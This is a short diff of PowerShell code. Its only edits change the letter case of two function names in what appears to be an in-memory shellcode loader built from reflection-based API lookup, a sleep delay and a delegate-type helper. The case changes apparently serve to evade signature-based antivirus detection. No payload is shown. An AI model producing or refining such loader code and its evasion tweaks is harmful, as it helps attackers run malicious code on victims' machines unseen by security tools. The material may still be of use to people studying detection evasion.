@@ -1,4 +1,4 @@
-function lookAlike{
+function lookAlIke{
 Param($moduleName, $functionName)
 
 $assem = ([AppDomain]::CurreNtDomain.GetAssEmblies() |
@@ -10,7 +10,7 @@ return $tmp[0].InvOke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($nul
 
 Start-Sleep 5
 
-function getDelegateType{
+function getDelegAteType{
 Param(
 [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
 [Parameter(Position = 1)] [Type] $delType = [Void]
